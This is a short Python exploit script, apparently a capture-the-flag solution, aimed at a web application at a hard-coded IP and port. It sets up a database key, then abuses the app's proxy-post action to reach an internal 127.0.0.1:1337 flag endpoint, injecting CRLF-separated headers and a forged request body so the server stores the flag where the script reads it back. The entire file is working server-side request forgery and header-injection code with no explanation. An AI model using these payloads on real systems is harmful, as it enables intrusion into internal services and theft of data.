from requests import get,post
from urllib import parse
dbkey = "flag"
key = "CHH"
url = "http://13.215.176.34:31665/"
length = len(f"mode=write&dbkey={dbkey}&key={key}")
payload = f"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {length}\r\n\r\nmode=write&dbkey={dbkey}&key={key}\r\n"

params = {
    "action":"db/create",
    "key" : dbkey
}
get(url,params=params)

params = {
    "action":"db/save",
    "dbkey":dbkey,
    "key":key,
    "value":key
}

get(url,params=params)

get(url+f"index.php?action=net/proxy/post&url=127.0.0.1:1337/action/flag/flag.php&{parse.quote(payload)}")
params = {
    "action":"db/read",
    "dbkey":dbkey,
    "key":key
}
print(get(url+f"index.php?action=db/read&dbkey={dbkey}&key={key}").text)